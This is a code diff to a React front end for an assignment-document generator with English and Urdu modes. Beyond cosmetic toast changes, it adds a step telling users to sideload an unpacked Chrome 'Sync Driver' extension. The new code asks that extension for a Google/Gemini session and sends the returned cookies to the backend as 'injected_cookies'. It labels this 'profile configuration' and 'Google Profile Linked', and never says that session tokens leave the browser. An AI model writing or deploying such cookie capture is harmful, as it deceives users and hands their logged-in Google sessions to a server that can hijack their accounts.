@@ -1,4 +1,4 @@
-import React, { useState, useRef, FormEvent } from 'react';
+import React, { useState, useRef, FormEvent, useEffect } from 'react';
 import toast, { Toaster } from 'react-hot-toast';
 import {
   UploadCloud,
@@ -25,11 +25,69 @@ export default function App() {
   const [filePreview, setFilePreview] = useState<string | null>(null);
   const [isDragging, setIsDragging] = useState<boolean>(false);
   const fileInputRef = useRef<HTMLInputElement>(null);
+  //🚀 Dynamic Extension ID aur Cookies ke liye states
+  const [extensionId, setExtensionId] = useState<string>('');
+  const [capturedCookies, setCapturedCookies] = useState<any[] | null>(null);
+  const [isVerifyingAuth, setIsVerifyingAuth] = useState<boolean>(false);
+
+  useEffect(() => {
+    console.log("use effect chl gya ha");
+    
+    const savedId = localStorage.getItem('user_assign_gen_ext_id');
+    if (savedId) {
+      setExtensionId(savedId);
+    }
+  }, []);
+  
+    // 🚀 BACKGROUND COOKIE SYNC ENGINE (DYNAMIC ID WORKER)
+    const chromeContext = (window as any).chrome;
+
+    const handleLanguageClickSync = async (selectedLang: 'English' | 'Urdu') => {
+    if (!extensionId.trim()) {
+      toast.error("Please enter your Chrome Extension ID first!", { position: 'top-center' });
+      return;
+    }
+
+    setIsVerifyingAuth(true);
+    const toastId = toast.loading("Checking profile configuration via Extension...", { position: 'top-center' });
+
+    if (!chromeContext || !chromeContext.runtime) {
+      toast.error("Extension engine missing. Desktop Chrome use kijiye.", { id: toastId, position: 'top-center' });
+      setIsVerifyingAuth(false);
+      setLanguage(selectedLang); // Fallback lock release
+      return;
+    }
+
+    // Dynamic extensionId use ho rahi hai yahan
+    chromeContext.runtime.sendMessage(extensionId.trim(), { action: "getGeminiSession" }, async (response:any) => {
+      setIsVerifyingAuth(false);
+      console.log(response);
+      
+      if (!response) {
+        toast.error("Extension se rabta nahi ho saka. Extension ID check kijiye!", { id: toastId, position: 'top-center' });
+        return;
+      }
+      if (response.status === "logged_out") {
+        toast.error("Aap browser profile mein login nahi hain! Pehle sign-in kijiye.", { id: toastId, position: 'top-center' });
+        // window.open("https://google.com", "_blank");
+        return;
+      }
+      if (response.status === "success" && response.cookies.length > 0) {
+        setCapturedCookies(response.cookies);
+        console.log(capturedCookies);
+        
+        setLanguage(selectedLang); // 100% UNLOCK PATH
+        toast.success(`Google Profile Linked! Form unlocked in ${selectedLang}.`, { id: toastId, position: 'top-center' });
+      }
+    }); 
+  };
 
   // Network State
   const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
-  const API_ENDPOINT = '/api/chat';
-  // const API_ENDPOINT = 'https://aiou-english-api.onrender.com/api/chat';
+  
+
+  const API_ENDPOINT = 'http://127.0.0.1:8000/api/chat';
+  // const API_ENDPOINT = '/api/chat';
   // Strict Regex Patterns
   const URDU_REGEX = /^[\u0600-\u06FF\s0-9?؟]+$/;
   // const ENGLISH_REGEX = /^[A-Za-z0-9\s.,?!'"()-]+$/;
@@ -43,21 +101,27 @@ export default function App() {
     // Type Check
     const validTypes = ['image/png', 'image/jpeg', 'image/jpg'];
     if (!validTypes.includes(file.type)) {
-      toast.error('Invalid image type! Please upload a PNG, JPG, or JPEG file.');
+      toast.error('Invalid image type! Please upload a PNG, JPG, or JPEG file.',{
+                    position:'top-center'
+                  });
       return;
     }
 
     // Size Restriction Check (< 200KB = 204,800 Bytes)
     const MAX_SIZE = 200 * 1024;
     if (file.size > MAX_SIZE) {
-      toast.error(`Image size (${(file.size / 1024).toFixed(1)} KB) exceeds the 200 KB limit!`);
+      toast.error(`Image size (${(file.size / 1024).toFixed(1)} KB) exceeds the 200 KB limit!`,{
+                    position:'top-center'
+                  });
       return;
     }
 
     setSelectedFile(file);
     const previewUrl = URL.createObjectURL(file);
     setFilePreview(previewUrl);
-    toast.success(`Logo uploaded (${(file.size / 1024).toFixed(1)} KB)`);
+    toast.success(`Logo uploaded (${(file.size / 1024).toFixed(1)} KB)`,{
+                    position:'top-center'
+                  });
   };
 
   const handleDragOver = (e: React.DragEvent) => {
@@ -95,7 +159,9 @@ export default function App() {
 
   const handleRemoveQuestion = (index: number) => {
     if (questions.length <= 1) {
-      toast.error('At least 1 question is required!');
+      toast.error('At least 1 question is required!',{
+                    position:'top-center'
+                  });
       return;
     }
     const updated = questions.filter((_, i) => i !== index);
@@ -111,27 +177,37 @@ export default function App() {
   // Strict Client-Side Validation Logic
   const validateForm = (): boolean => {
     if (!language) {
-      toast.error('Please select a language (English or Urdu) to unlock and submit the form.');
+      toast.error('Please select a language (English or Urdu) to unlock and submit the form.',{
+                    position:'top-center'
+                  });
       return false;
     }
 
     if (!assignmentNo.trim() || isNaN(Number(assignmentNo)) || Number(assignmentNo) <= 0) {
-      toast.error('Assignment Number is required and must be a valid positive number.');
+      toast.error('Assignment Number is required and must be a valid positive number.',{
+                    position:'top-center'
+                  });
       return false;
     }
 
     if (!courseCode.trim()) {
-      toast.error('Course Code is required (e.g., 8611).');
+      toast.error('Course Code is required (e.g., 8611).',{
+                    position:'top-center'
+                  });
       return false;
     }
 
     if (!semester.trim()) {
-      toast.error('Semester is required (e.g., Spring 2026).');
+      toast.error('Semester is required (e.g., Spring 2026).',{
+                    position:'top-center'
+                  });
       return false;
     }
 
     if (!studentName.trim()) {
-      toast.error('Student Name is required.');
+      toast.error('Student Name is required.',{
+                    position:'top-center'
+                  });
       return false;
     }
 
@@ -151,20 +227,26 @@ export default function App() {
     }
 
     if (!questions || questions.length === 0) {
-      toast.error('At least one question must be provided.');
+      toast.error('At least one question must be provided.',{
+                    position:'top-center'
+                  });
       return false;
     }
 
     for (let i = 0; i < questions.length; i++) {
       const q = questions[i].trim();
       if (!q) {
-        toast.error(`Question #${i + 1} is empty! Please write a question or remove the row.`);
+        toast.error(`Question #${i + 1} is empty! Please write a question or remove the row.`,{
+                    position:'top-center'
+                  });
         return false;
       }
 
       if (language === 'Urdu') {
         if (!URDU_REGEX.test(q)) {
-          toast.error(`Question #${i + 1} contains invalid characters. Urdu mode strictly accepts Urdu characters only.`);
+          toast.error(`Question #${i + 1} contains invalid characters. Urdu mode strictly accepts Urdu characters only.`,{
+                    position:'top-center'
+                  });
           return false;
         }
       } 
@@ -188,7 +270,9 @@ export default function App() {
     }
 
     setIsSubmitting(true);
-    const toastId = toast.loading('Generating Document...');
+    const toastId = toast.loading('Generating Document...',{
+                    position:'top-center'
+                  });
 
     try {
       // 1. Construct FormData Payload
@@ -196,15 +280,22 @@ export default function App() {
       if (selectedFile) {
         formData.append('logo_image', selectedFile);
       }
-
+      
+      let activeTabUUID = sessionStorage.getItem('user_active_tab_uuid');
+      if (!activeTabUUID) {
+        activeTabUUID = 'tab_' + Math.random().toString(36).substring(2, 15);
+        sessionStorage.setItem('user_active_tab_uuid', activeTabUUID);
+      }
       const payload = {
+        user_uuid: activeTabUUID,
         assignment_no: Number(assignmentNo),
         course_code: Number(courseCode),
         semester: semester.trim(),
         student_name: studentName.trim(),
         registration_id: registrationId.trim(),
         questions: questions.map(q => q.trim()),
-        language
+        language,
+        injected_cookies: capturedCookies 
       };
 
       formData.append('chatData', JSON.stringify(payload));
@@ -226,9 +317,9 @@ export default function App() {
             const errorText = await blob.text();
             const errorJson = JSON.parse(errorText);
             const detailMsg = errorJson?.detail?.error || errorJson?.detail || errorJson?.message || 'Validation error from server';
-            toast.error(`Backend Error: ${typeof detailMsg === 'object' ? JSON.stringify(detailMsg) : detailMsg}`, { id: toastId });
+            toast.error(`Backend Error: ${typeof detailMsg === 'object' ? JSON.stringify(detailMsg) : detailMsg}`, { id: toastId ,position:'top-center'});
           } catch {
-            toast.error(`HTTP ${response.status}: Failed to generate document from server.`, { id: toastId });
+            toast.error(`HTTP ${response.status}: Failed to generate document from server.`, { id: toastId ,position:'top-center'});
           }
           setIsSubmitting(false);
           return;
@@ -239,7 +330,7 @@ export default function App() {
       }
 
       // Success Toast & Native File Downloader
-      toast.success('Assignment generated! Downloading your Word file...', { id: toastId });
+      toast.success('Assignment generated! Downloading your Word file...', { id: toastId,position:'top-center' });
 
       const downloadUrl = window.URL.createObjectURL(blob);
       const tempLink = document.createElement('a');
@@ -254,7 +345,7 @@ export default function App() {
 
     } catch (err: any) {
       console.error('Submission failed:', err);
-      toast.error(`Failed to generate document: ${err?.message || 'Unknown error'}`, { id: toastId });
+      toast.error(`Failed to generate document: ${err?.message || 'Unknown error'}`, { id: toastId,position:'top-center' });
     } finally {
       setIsSubmitting(false);
     }
@@ -262,7 +353,7 @@ export default function App() {
 
   return (
     <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col font-sans">
-      <Toaster position="top-right" toastOptions={{ duration: 4000 }} />
+      <Toaster position="top-right" toastOptions={{ duration: 4000,position:'top-center' }} />
 
       {/* HEADER */}
       <header className="bg-white border-b border-slate-200 px-6 sm:px-8 py-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 shrink-0 shadow-xs">
@@ -283,40 +374,95 @@ export default function App() {
         <div className="flex items-center gap-3 self-stretch md:self-auto justify-end">
           {/* Language Selector Pills */}
           <div className="flex bg-slate-100 p-1 rounded-xl border border-slate-200 shadow-inner">
-            <button
-              type="button"
-              onClick={() => {
-                setLanguage('English');
-                toast.success('ENGLISH selected!');
-              }}
-              className={`px-5 py-2 rounded-lg text-xs font-black uppercase transition-all ${
-                language === 'English'
-                  ? 'bg-blue-600 text-white shadow-md shadow-blue-500/20'
-                  : 'text-slate-500 hover:text-slate-900'
-              }`}
-            >
-              ENGLISH
-            </button>
-            <button
-              type="button"
-              onClick={() => {
-                setLanguage('Urdu');
-                toast.success('اردو (URDU) منتخب کر لی گئی!');
-              }}
-              className={`px-5 py-2 rounded-lg text-xs font-black uppercase font-urdu transition-all ${
-                language === 'Urdu'
-                  ? 'bg-emerald-600 text-white shadow-md shadow-emerald-500/20'
-                  : 'text-slate-500 hover:text-slate-900'
-              }`}
-            >
-              URDU (اردو)
-            </button>
+      <button
+  type="button"
+  onClick={() => {
+    // 1. Language reset karke home par bhejen
+    setLanguage(''); 
+
+    // 2. Saari form input states ko clear/reset karein
+    setAssignmentNo('');
+    setCourseCode('');
+    setSemester('Spring 2026'); // Jo aapka default semester tha
+    setStudentName('');
+    setRegistrationId('');
+    setQuestions(['']); // Questions ki array ko wapas single empty row kar dein
+    
+    // 3. File upload state ko clear karein
+    if (filePreview) {
+      URL.revokeObjectURL(filePreview); // Memory leak se bachne ke liye preview URL khatam karein
+    }
+    setSelectedFile(null);
+    setFilePreview(null);
+    if (fileInputRef.current) {
+      fileInputRef.current.value = ''; // File input field ko reset karein
+    }
+
+    // 4. Success message toast
+    toast.success('Form Reset & Back to HOME!', {
+      position: 'top-center'
+    });
+  }}
+  disabled={language === ''}
+  className={`px-5 py-2 rounded-lg text-xs font-black uppercase transition-all ${
+    language === '' 
+      ? 'bg-blue-600 text-white shadow-md shadow-blue-500/20 opacity-50 cursor-not-allowed' // Disabled state styling
+      : 'text-slate-500 hover:bg-blue-600 hover:text-white'
+  }`}
+>
+  HOME
+</button>
+
           </div>
         </div>
       </header>
 
       {/* MAIN CONTENT AREA */}
       <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 lg:p-8 space-y-8">
+              {/* 🚀 EXTENSION SYSTEM INTEGRATION CARD */}
+        {
+          !language && (
+
+        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-2xl p-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 shadow-xs">
+          <div className="space-y-1 flex-1">
+            <h3 className="text-sm font-black uppercase tracking-tight text-blue-900">
+              Step 1: Download &amp; Link AssignGen Sync Driver
+            </h3>
+            <p className="text-xs font-medium text-slate-500 max-w-2xl leading-relaxed">
+              Download helper driver workspace layout archive. Unzip it on your computer, access <code>chrome://extensions/</code> in Chrome, switch <b>Developer mode (Top Right)</b> on, click <b>Load unpacked (Top Left)</b> and select the folder. Copy the Extension ID and paste it on the right input field.
+            </p>
+          </div>
+          
+          {/* Dynamic input element container for each unique user setup */}
+          <div className="flex flex-col md:flex-row items-stretch md:items-center gap-3 w-full md:w-auto shrink-0">
+            <div className="flex flex-col gap-1 w-full md:w-52">
+              <span className="text-[9px] font-black uppercase text-slate-400 tracking-wider">
+                Enter Your Extension ID *
+              </span>
+              <input 
+                type="text" 
+                placeholder="Paste Extension ID here..." 
+                value={extensionId}
+                onChange={(e) => {
+                  setExtensionId(e.target.value);
+                  localStorage.setItem('user_assign_gen_ext_id', e.target.value); // Saves inside browser database automatically
+                }}
+                className="px-3 py-2.5 border border-slate-200 rounded-xl text-xs font-mono outline-none bg-white shadow-xs focus:ring-2 focus:ring-blue-500 focus:border-transparent" 
+              />
+            </div>
+
+            <a 
+              href="/extension.zip" 
+              download="AssignGen_Driver.zip" 
+              className="px-5 py-3 bg-blue-600 hover:bg-blue-700 text-white text-xs font-black uppercase tracking-wider rounded-xl shadow-md transition-transform active:scale-95 flex items-center justify-center gap-2 cursor-pointer self-end md:self-auto w-full md:w-auto"
+            >
+              <span>Download Driver</span>
+              <Download className="w-4 h-4" />
+            </a>
+          </div>
+        </div>
+          )
+        }
 
         {/* MANDATORY LANGUAGE SELECTION PROMPT IF UNSET */}
         {!language && (
@@ -333,20 +479,15 @@ export default function App() {
             <div className="flex justify-center gap-4 pt-2">
               <button
                 type="button"
-                onClick={() => {
-                  setLanguage('English');
-                  toast.success('ENGLISH selected!');
-                }}
+                onClick={() => handleLanguageClickSync('English')}
+                
                 className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-black text-sm uppercase tracking-wider rounded-xl shadow-lg shadow-blue-500/20 transition-all hover:scale-105"
               >
                 SELECT ENGLISH
               </button>
               <button
                 type="button"
-                onClick={() => {
-                  setLanguage('Urdu');
-                  toast.success('اردو (URDU) منتخب کر لی گئی!');
-                }}
+                onClick={() => handleLanguageClickSync('Urdu')}
                 className="px-8 py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-black text-sm uppercase tracking-wider rounded-xl shadow-lg shadow-emerald-500/20 font-urdu transition-all hover:scale-105"
               >
                 منتخب کریں (URDU)
